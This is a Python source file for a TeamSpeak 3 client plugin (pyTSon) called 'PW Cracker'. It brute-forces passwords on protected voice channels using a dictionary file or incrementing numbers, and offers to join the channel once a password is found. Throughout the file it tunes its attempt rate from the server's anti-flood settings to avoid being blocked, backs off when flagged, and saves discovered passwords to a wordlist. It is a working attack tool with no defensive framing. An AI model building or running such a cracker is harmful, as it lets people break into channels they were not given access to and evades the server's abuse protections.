import pytson, ts3lib, os
from pluginhost import PluginHost
from ts3plugin import ts3plugin
from ts3defines import *
from datetime import datetime
from PythonQt.QtGui import QInputDialog, QWidget, QMessageBox, QDialog
from PythonQt.QtCore import Qt, QTimer
from pytsonui import setupUi


def channelURL(schid=None, cid=0, name=None):
    if schid == None:
        try: schid = ts3lib.getCurrentServerConnectionHandlerID()
        except: pass
    if name == None:
        try: (error, name) = ts3lib.getChannelVariable(schid, cid, ChannelProperties.CHANNEL_NAME)
        except: name = cid
    return '[b][url=channelid://{0}]"{1}"[/url][/b]'.format(cid, name)
def clientURL(schid=None, clid=0, uid=None, nickname=None):
    if schid == None:
        try: schid = ts3lib.getCurrentServerConnectionHandlerID()
        except: pass
    if uid == None:
        try: (error, uid) = ts3lib.getClientVariable(schid, clid, ClientProperties.CLIENT_UNIQUE_IDENTIFIER)
        except: pass
    if nickname == None:
        try: (error, nickname) = ts3lib.getClientVariable(schid, clid, ClientProperties.CLIENT_NICKNAME)
        except: nickname = uid
    return '[url=client://{0}/{1}]{2}[/url]'.format(clid, uid, nickname)


def inputBox(title, text):
    x = QWidget()
    x.setAttribute(Qt.WA_DeleteOnClose)
    return QInputDialog.getText(x, title, text)


def msgBox(text, icon=QMessageBox.Information):
    x = QMessageBox()
    x.setText(text)
    x.setIcon(icon)
    x.exec()


def confirm(title, message):
    x = QDialog()
    x.setAttribute(Qt.WA_DeleteOnClose)
    _x = QMessageBox.question(x, title, message, QMessageBox.Yes, QMessageBox.No)
    if _x == QMessageBox.Yes: return True if _x == QMessageBox.Yes else False


class passwordCracker(ts3plugin):
    name = "PW Cracker"
    apiVersion = 22
    requestAutoload = True
    version = "1.0"
    author = "Bluscream"
    description = "<insert lenny face here>"
    offersConfigure = False
    commandKeyword = ""
    infoTitle = "[b]Cracking Password...[/b]"
    menuItems = [
        (PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "== {0} ==".format(name), ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 1, "Stop Cracker", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 2, "Add PW to cracker", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 10, "== {0} ==".format(name), ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 11, "== {0} ==".format(name), ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 1, "Crack PW (Dictionary)", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 2, "Crack PW (Bruteforce)", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 3, "Add PW to cracker", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 4, "Try Password", ""),
        (PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 12, "== {0} ==".format(name), "")
    ]
    hotkeys = []
    debug = False
    pwpath = os.path.join(pytson.getPluginPath(), "scripts", __name__, "pws.txt")
    schid = 0
    cid = 0
    pws = []
    pwc = 0
    flooding = False
    timer = QTimer()
    interval = 300
    antiflood_delay = 2500
    step = 1
    retcode = ""
    mode = 0
    dlg = None
    status = ""
    verify_antiflood_points = 5



    @staticmethod
    def timestamp(): return '[{:%Y-%m-%d %H:%M:%S}] '.format(datetime.now())

    def __init__(self):
        content = []
        with open(self.pwpath, encoding="utf8") as f:
            content = f.readlines()
        self.pws = [x.strip() for x in content]
        self.timer.timeout.connect(self.tick)
        # self.getInterval(ts3lib.getCurrentServerConnectionHandlerID())
        ts3lib.requestServerVariables(ts3lib.getCurrentServerConnectionHandlerID())
        if self.debug: ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(self.timestamp(),self.name,self.author))

    def stop(self):
        self.timer.stop()
        self.timer = None
        del self.timer
        self.timer = QTimer()

    def menuCreated(self):
        if not self.name in PluginHost.active: return
        for id in [0,10,11,12]:
            ts3lib.setPluginMenuEnabled(PluginHost.globalMenuID(self, id), False)

    def startTimer(self, schid=0, cid=0):
        if schid != 0: self.schid = schid
        if cid != 0: self.cid = cid
        self.timer.start(self.interval)
        self.tick()
        ts3lib.requestInfoUpdate(self.schid, PluginItemType.PLUGIN_CHANNEL, self.cid)

    def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
        if atype == PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL:
            if menuItemID == 0:
                if not self.dlg: self.dlg = StatusDialog(self)
                self.dlg.show();
                self.dlg.raise_();
                self.dlg.activateWindow()
            elif menuItemID == 1:
                (err, haspw) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_FLAG_PASSWORD)
                if not haspw:
                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_NAME)
                    msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
                self.mode = 0
                self.step = 1
                self.pwc = 0
                self.startTimer(schid, selectedItemID)
            elif menuItemID == 2:
                (err, haspw) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_FLAG_PASSWORD)
                if not haspw:
                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_NAME)
                    msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
                self.mode = 1
                step = inputBox(self.name, 'How much to increase per try?')
                if step: self.step = int(step)
                start = inputBox(self.name, 'Where to start?')
                if start: self.pwc = int(start)
                self.startTimer(schid, selectedItemID)
            elif menuItemID == 3:
                (err, path, pw) = ts3lib.getChannelConnectInfo(schid, selectedItemID)
                if pw == None or pw == False or pw == "":
                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_NAME)
                    msgBox('No password saved for channel {0}'.format(name));return
                elif pw in self.pws:
                    msgBox("Not adding \"{0}\" to password db\n\nIt already exists!".format(pw), QMessageBox.Warning);return
                self.pws.append(pw)
                with open(self.pwpath, "a") as myfile:
                    myfile.write('\n{0}'.format(pw))
                msgBox("Added \"{0}\" to password db".format(pw))
            elif menuItemID == 4:
                (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ChannelProperties.CHANNEL_NAME)
                pw = inputBox("{0} - {1}".format(self.name,name), "Password:")
                self.schid = schid;self.cid = selectedItemID;self.pw = pw
                ts3lib.verifyChannelPassword(schid, selectedItemID, pw, "passwordCracker:manual")
        elif atype == PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL:
            if menuItemID == 1:
                self.timer.stop()
                ts3lib.printMessageToCurrentTab('Timer stopped!')
            elif menuItemID == 2:
                pw = inputBox("Enter Channel Password to add", "Password:")
                if pw is None or pw == False or pw == "":
                    msgBox("Not adding \"{0}\" to password db".format(pw), QMessageBox.Warning);return
                elif pw in self.pws:
                    msgBox("Not adding \"{0}\" to password db\n\nIt already exists!".format(pw), QMessageBox.Warning);return
                self.pws.append(pw)
                with open(self.pwpath, "a") as myfile:
                    myfile.write('\n{0}'.format(pw))
                msgBox("Added \"{0}\" to password db".format(pw))

    def infoData(self, schid, id, atype):
        if not atype == PluginItemType.PLUGIN_CHANNEL: return None
        if not self.cid == id: return None
        if not self.schid == schid: return None
        if self.mode == 0: msg = "Trying: {0} / {1}\nCurrent: {2}\nStatus: {3}".format(self.pwc+1, len(self.pws)+1, self.pws[self.pwc], self.status)
        elif self.mode == 1: msg = "Trying: {0}\nStatus: {1}".format(self.pwc, self.status)
        return [msg]

    def tick(self):
        try:
            self.retcode = ts3lib.createReturnCode()
            if self.mode == 0:
                if self.pwc >= len(self.pws):
                    self.timer.stop()
                    (err, name) = ts3lib.getChannelVariable(self.schid, self.cid, ChannelProperties.CHANNEL_NAME)
                    msgBox("Password for channel \"{0}\" was not found :(\n\nTried {1} passwords.".format(name, self.pwc+1))
                    self.schid = 0;self.cid = 0;self.pwc = 0;return
                pw = self.pws[self.pwc]
            elif self.mode == 1: pw = str(self.pwc)
            err = ts3lib.verifyChannelPassword(self.schid, self.cid, pw, self.retcode)
            if err != ERROR_ok:
                (er, status) = ts3lib.getErrorMessage(err)
                print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(status, err, pw, self.cid, self.schid))
            # else: print('[{0}] Trying password \"{1}\" for channel #{2} on server #{3}'.format(self.pwc, pw, self.cid, self.schid))
            if not self.flooding: self.pwc += self.step
        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), LogLevel.LogLevel_ERROR, "pyTSon", 0)

    def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
        if returnCode == "passwordCracker:manual":
            (err, name) = ts3lib.getChannelVariable(schid, self.cid, ChannelProperties.CHANNEL_NAME)
            errorMessage = errorMessage.title()
            msgBox("Channel: {0}\n\nPW: {1}\n\nResult: {2}".format(name, self.pw,errorMessage))
        if not returnCode == self.retcode: return
        errorMessage = errorMessage.title()
        if error == ERROR_channel_invalid_password:
            if self.flooding: self.flooding = False
            self.status = '[color=orange]{0}[/color]'.format(errorMessage)
            ts3lib.requestInfoUpdate(schid, PluginItemType.PLUGIN_CHANNEL, self.cid)
        elif error == ERROR_client_is_flooding:
            self.flooding = True
            self.timer.stop()
            QTimer.singleShot(self.antiflood_delay, self.startTimer)
            self.status = '[color=red]{0}[/color]'.format(errorMessage)
            ts3lib.requestInfoUpdate(schid, PluginItemType.PLUGIN_CHANNEL, self.cid)
        elif error == ERROR_channel_invalid_id:
            self.timer.stop()
            self.status = '[color=red]{0}[/color]'.format(errorMessage)
            ts3lib.requestInfoUpdate(schid, PluginItemType.PLUGIN_CHANNEL, self.cid)
            msgBox("Channel #{0} is invalid!\n\nStopping Cracker!".format(self.cid), QMessageBox.Warning)
        elif error == ERROR_ok:
            if self.flooding: self.flooding = False
            self.timer.stop()
            (err, name) = ts3lib.getChannelVariable(schid, self.cid, ChannelProperties.CHANNEL_NAME)
            ts3lib.printMessageToCurrentTab('Channel: {0} Password: \"{1}\"'.format(channelURL(schid, self.cid, name), self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1))
            self.status = '[color=green]{0}[/color]'.format(errorMessage)
            ts3lib.requestInfoUpdate(schid, PluginItemType.PLUGIN_CHANNEL, self.cid)
            if confirm("Password found! ({0} / {1})".format(self.pwc, len(self.pws)) if self.mode == 0 else "Password found!",
                       "Password \"{0}\" was found for channel \"{1}\"\n\nDo you want to join now?".format(self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1,name)):
                (err, ownID) = ts3lib.getClientID(schid)
                ts3lib.requestClientMove(schid, ownID, self.cid, self.pws[self.pwc-1] if self.mode == 0 else str(self.pwc-1))
        else:
            self.status = errorMessage
            ts3lib.requestInfoUpdate(schid, PluginItemType.PLUGIN_CHANNEL, self.cid)
        if error in [ERROR_channel_invalid_id, ERROR_ok] or returnCode in ["passwordCracker:manual"]: self.schid = 0;self.cid = 0;self.pwc = 0
        return 1

    def onClientMoveEvent(self, schid, clientID, oldChannelID, newChannelID, visibility, moveMessage):
        pass

    def onUpdateChannelEditedEvent(self, schid, channelID, invokerID, invokerName, invokerUniqueIdentiﬁer):
        if not self.cid == channelID: return
        if not self.schid == schid: return
        (err, haspw) = ts3lib.getChannelVariable(schid, channelID, ChannelProperties.CHANNEL_FLAG_PASSWORD)
        if haspw: return
        self.timer.stop()
        (err, name) = ts3lib.getChannelVariable(schid, channelID, ChannelProperties.CHANNEL_NAME)
        if confirm("Password removed", "Password was removed from channel \"{0}\" by \"{1}\"\n\nDo you want to join now?".format(name, invokerName)):
            (err, ownID) = ts3lib.getClientID(self.schid)
            ts3lib.requestClientMove(schid, ownID, channelID, "")
        self.schid = 0;self.cid = 0;self.pwc = 0

    def onDelChannelEvent(self, schid, channelID, invokerID, invokerName, invokerUniqueIdentiﬁer):
        if not self.cid == channelID: return
        if not self.schid == schid: return
        self.timer.stop()
        msgBox("Channel #{0} got deleted by \"{1}\"\n\nStopping Cracker!".format(self.cid, invokerName), QMessageBox.Warning)
        self.schid = 0;self.cid = 0;self.pwc = 0

    def onServerUpdatedEvent(self, schid):
        (err, cmdblock) = ts3lib.getServerVariable(schid, VirtualServerPropertiesRare.VIRTUALSERVER_ANTIFLOOD_POINTS_NEEDED_COMMAND_BLOCK)
        (err, ipblock) = ts3lib.getServerVariable(schid, VirtualServerPropertiesRare.VIRTUALSERVER_ANTIFLOOD_POINTS_NEEDED_IP_BLOCK)
        (err, afreduce) = ts3lib.getServerVariable(schid, VirtualServerPropertiesRare.VIRTUALSERVER_ANTIFLOOD_POINTS_TICK_REDUCE)
        ts3lib.logMessage("schid = {0} | err = {1} | afreduce = {2} | cmdblock = {3} | ipblock = {4} | verify_antiflood_points = {5}".format(schid, err, afreduce, cmdblock, ipblock, self.verify_antiflood_points), LogLevel.LogLevel_INFO, "pyTSon", 0)
        self.interval = round(1000/((afreduce/self.verify_antiflood_points)))
        ts3lib.logMessage("Set interval to {0}".format(self.interval), LogLevel.LogLevel_INFO, "pyTSon", 0)

    def onConnectStatusChangeEvent(self, schid, newStatus, errorNumber):
        if newStatus == ConnectStatus.STATUS_CONNECTION_ESTABLISHED:
            # self.getInterval(schid)
            ts3lib.requestServerVariables(schid)
        if newStatus == ConnectStatus.STATUS_DISCONNECTED:
            if not self.schid == schid: return
            self.timer.stop()
            (err, name) = ts3lib.getChannelVariable(schid, self.cid, ChannelProperties.CHANNEL_NAME)
            msgBox("Server left\n\nStopping Cracker!", QMessageBox.Warning)
            self.schid = 0;self.cid = 0;self.pwc = 0

class StatusDialog(QDialog):
    def __init__(self, plugin, parent=None):
        try:
            # self.schid = schid;self.uids = uids
            super(QDialog, self).__init__(parent)
            setupUi(self, os.path.join(pytson.getPluginPath(), "scripts", "passwordCracker", "status.ui"))
            self.setAttribute(Qt.WA_DeleteOnClose)
            self.setWindowTitle('{0} - Idle'.format(plugin.name))
        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), LogLevel.LogLevel_ERROR, "pyTSon", 0)

    def on_send_clicked(self):
        for uid in self.uids:
            try: ts3lib.requestMessageAdd(self.schid, uid, self.subject.text, self.message.toPlainText())
            except: from traceback import format_exc;ts3lib.logMessage(format_exc(), LogLevel.LogLevel_ERROR, "pyTSon", 0)

    def on_pushButton_3_clicked(self): self.close()
